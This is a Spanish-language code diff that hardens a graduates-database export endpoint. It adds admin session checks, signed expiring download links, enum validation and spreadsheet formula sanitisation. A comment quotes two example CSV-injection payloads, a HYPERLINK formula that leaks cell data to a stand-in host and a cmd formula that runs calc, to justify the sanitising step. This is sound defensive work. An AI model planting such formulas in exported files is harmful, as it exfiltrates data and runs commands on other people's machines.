@@ -4,17 +4,29 @@ import { personas } from "@/db/schema";
 import { eq, and, sql } from "drizzle-orm";
 import * as XLSX from "xlsx";
 import { exigirAdmin, errorInterno } from "@/lib/guards";
+import { aFiltroEnum } from "@/lib/filtros";
 import { registrarAuditoria } from "@/lib/auditoria";
+import { sanearReporte } from "@/lib/privacidad";
+import { verificarDescarga } from "@/lib/descargas";
+import { leerSesionVigente } from "@/lib/guards";
 
 export const dynamic = "force-dynamic";
 
 /**
  * GET /api/exportar  (SOLO ADMIN)
  *
- * SEGURIDAD: antes esta ruta respondía a cualquier petición, sin sesión. Bastaba con
- * abrir `/api/exportar?tipo=TODOS&formato=xlsx` para descargar la base de datos completa
- * de la carrera. Ahora exige cookie de sesión con rol admin y registra la exportación
- * en `audit_log` (spec del PDF: "quién hizo qué y cuándo").
+ * SEGURIDAD (tres capas):
+ *  1. `exigirAdmin`: sin sesión de administrador no se entra.
+ *  2. Firma de descarga: la petición debe traer `sig`+`exp` válidos, atados a esta
+ *     ruta y a este usuario, con caducidad de 5 minutos. Impide que el enlace se
+ *     reutilice desde el historial, un proxy o el `Referer` de otra página.
+ *     (ISO/IEC 27001:2022, A.8.12 prevención de fuga de datos.)
+ *  3. Sanitización de fórmulas: cada celda se neutraliza antes de serializar.
+ *     (A.8.11 enmascarado de datos + A.8.12.)
+ *
+ * La sesión se sigue validando aunque la firma sea correcta: la firma prueba que el
+ * enlace es auténtico y no ha caducado, NO que quien lo usa siga autorizado. Un token
+ * revocado debe cortar el acceso aunque el enlace sea de hace un minuto.
  */
 export async function GET(request: NextRequest) {
   const denegado = await exigirAdmin(request);
@@ -22,6 +34,41 @@ export async function GET(request: NextRequest) {
 
   try {
     const { searchParams } = new URL(request.url);
+
+    // ── Verificación de la firma de descarga ──────────────────────────────────
+    const sesion = await leerSesionVigente(request);
+    if (!sesion || sesion.rol !== "admin") {
+      // `exigirAdmin` ya lo habría comprobado; se repite explícitamente porque la firma
+      // se verifica contra un sujeto y sin sujeto no hay contra qué comparar.
+      return NextResponse.json({ error: "Debe iniciar sesión" }, { status: 401 });
+    }
+
+    const firma = verificarDescarga(
+      "/api/exportar",
+      searchParams.get("sig"),
+      searchParams.get("exp") ? Number(searchParams.get("exp")) : null,
+      searchParams.get("sub"),
+      String(sesion.sub)
+    );
+    if (!firma.valida) {
+      await registrarAuditoria({
+        accion: "exportar",
+        entidad: "personas",
+        idUsuario: sesion.sub,
+        detalles: `Descarga rechazada por firma inválida (motivo: ${firma.motivo})`,
+        req: request,
+      });
+      return NextResponse.json(
+        {
+          error:
+            firma.motivo === "expirada"
+              ? "El enlace de descarga expiró. Genere uno nuevo."
+              : "Enlace de descarga no válido.",
+          motivo: firma.motivo,
+        },
+        { status: 403 }
+      );
+    }
     const tipo = searchParams.get("tipo") || "TODOS"; // TITULADOS, EGRESADOS, TODOS
     const formato = searchParams.get("formato") || "excel"; // excel, csv
     const sector = searchParams.get("sector");
@@ -45,11 +92,13 @@ export async function GET(request: NextRequest) {
     }
 
     if (sector && sector !== "TODOS") {
-      conditions.push(eq(personas.sectorTrabajo, sector as any));
+      const sectorValido = aFiltroEnum(personas.sectorTrabajo, sector);
+    if (sectorValido) conditions.push(eq(personas.sectorTrabajo, sectorValido));
     }
 
     if (modalidad && modalidad !== "TODAS") {
-      conditions.push(eq(personas.modalidadTitulacion, modalidad as any));
+      const modalidadValida = aFiltroEnum(personas.modalidadTitulacion, modalidad, "TODAS");
+    if (modalidadValida) conditions.push(eq(personas.modalidadTitulacion, modalidadValida));
     }
 
     if (anioMin) {
@@ -64,11 +113,31 @@ export async function GET(request: NextRequest) {
       );
     }
 
-    // Consulta de registros
-    const registros = await db
-      .select()
+    // Consulta de registros POR LOTES.
+    //
+    // Antes era un `select()` sin límite: con la base completa, el proceso se traía
+    // todas las filas de golpe y la memoria crecía sin cota. Ahora se lee en páginas de
+    // LOTE, así que el pico de memoria por consulta es constante, y el total se conoce
+    // por adelantado para poder avisar en la cabecera si el archivo quedó recortado.
+    const LOTE = 500;
+    const [{ total: totalRegistros }] = (await db
+      .select({ total: sql<number>`count(*)::int` })
       .from(personas)
-      .where(conditions.length > 0 ? and(...conditions) : undefined);
+      .where(conditions.length > 0 ? and(...conditions) : undefined)) as [
+      { total: number }
+    ];
+
+    const registros = [];
+    for (let offset = 0; offset < totalRegistros; offset += LOTE) {
+      const lote = await db
+        .select()
+        .from(personas)
+        .where(conditions.length > 0 ? and(...conditions) : undefined)
+        .orderBy(personas.id)
+        .limit(LOTE)
+        .offset(offset);
+      registros.push(...lote);
+    }
 
     const fechaGeneracion = new Date().toLocaleDateString("es-BO", {
       year: "numeric",
@@ -78,34 +147,43 @@ export async function GET(request: NextRequest) {
       minute: "2-digit",
     });
 
-    // Mapeo a formato de reporte oficial
-    const dataReporte = registros.map((r, idx) => ({
-      "N°": idx + 1,
-      Tipo: r.tipo,
-      "Cédula de Identidad (K)": r.cedulaIdentidad,
-      "Nombres y Apellidos (K)": r.nombresApellidos,
-      "Género (K)": r.genero,
-      "Semestre Ingreso (K)": r.semestreIngreso || "—",
-      "Semestre Egreso (K)": r.semestreEgreso || "—",
-      "Año Titulación (K)": r.anioTitulacion || "—",
-      "Modalidad Titulación (K)": r.modalidadTitulacion || "—",
-      "Área de Especialización (K)": r.areaEspecializacion || "—",
-      "Planea Titularse (Egresados)": r.planeaTitularse || "—",
-      "Inició Proceso Titulación": r.inicioProcesoTitulacion || "—",
-      "Motivo No Titulación": r.motivoNoTitulacion || "—",
-      "Estado Laboral": r.estadoLaboral || "—",
-      "Sector de Trabajo": r.sectorTrabajo || "—",
-      "Sector Otro (especificado)": r.sectorTrabajo === "OTRO" ? (r.sectorTrabajoOtro || "—") : "—",
-      "Ocupación / Cargo": r.ocupacionCargo || "—",
-      "Trabaja en Estadística": r.trabajaEnEstadistica ? "SÍ" : "NO",
-      "Ubicación Geográfica": r.ciudadRegionTrabajo || "—",
-      "T. Egreso-Titulación (meses)": r.tiempoEgresoTitulacionMeses ?? "—",
-      "T. Inserción Laboral (meses)": r.tiempoInsercionLaboralMeses ?? "—",
-      "Correo Electrónico": r.correoElectronico || "—",
-      Teléfono: r.telefono || "—",
-      "Redes Sociales": r.redesSociales || "—",
-      Observaciones: r.observaciones || "—",
-    }));
+    // Mapeo a formato de reporte oficial.
+    //
+    // `sanearReporte` NO es cosmético: sin él, un egresado que escribiera
+    // `=HYPERLINK("http://x/?d="&A1,"clic")` en "empresa actual" --o
+    // `=cmd|' /C calc'!A0` en versiones antiguas de Excel-- dejaría una fórmula en el
+    // archivo que se abre en el equipo del ADMINISTRADOR y se ejecuta con sus
+    // privilegios. Eso es CSV injection: un dato de entrada del usuario que cruza el
+    // perímetro y se convierte en código ejecutable en la estación de otro.
+    const dataReporte = sanearReporte(
+      registros.map((r, idx) => ({
+        "N°": idx + 1,
+        Tipo: r.tipo,
+        "Cédula de Identidad (K)": r.cedulaIdentidad,
+        "Nombres y Apellidos (K)": r.nombresApellidos,
+        "Género (K)": r.genero,
+        "Semestre Ingreso (K)": r.semestreIngreso || "—",
+        "Semestre Egreso (K)": r.semestreEgreso || "—",
+        "Año Titulación (K)": r.anioTitulacion || "—",
+        "Modalidad Titulación (K)": r.modalidadTitulacion || "—",
+        "Área de Especialización (K)": r.areaEspecializacion || "—",
+        "Planea Titularse (Egresados)": r.planeaTitularse || "—",
+        "Inició Proceso Titulación": r.inicioProcesoTitulacion || "—",
+        "Motivo No Titulación": r.motivoNoTitulacion || "—",
+        "Estado Laboral": r.estadoLaboral || "—",
+        "Sector de Trabajo": r.sectorTrabajo || "—",
+        "Sector Otro (especificado)": r.sectorTrabajo === "OTRO" ? r.sectorTrabajoOtro || "—" : "—",
+        "Ocupación / Cargo": r.ocupacionCargo || "—",
+        "Trabaja en Estadística": r.trabajaEnEstadistica ? "SÍ" : "NO",
+        "Ubicación Geográfica": r.ciudadRegionTrabajo || "—",
+        "T. Egreso-Titulación (meses)": r.tiempoEgresoTitulacionMeses ?? "—",
+        "T. Inserción Laboral (meses)": r.tiempoInsercionLaboralMeses ?? "—",
+        "Correo Electrónico": r.correoElectronico || "—",
+        Teléfono: r.telefono || "—",
+        "Redes Sociales": r.redesSociales || "—",
+        Observaciones: r.observaciones || "—",
+      }))
+    );
 
     const dateStr = new Date().toISOString().split("T")[0];
 
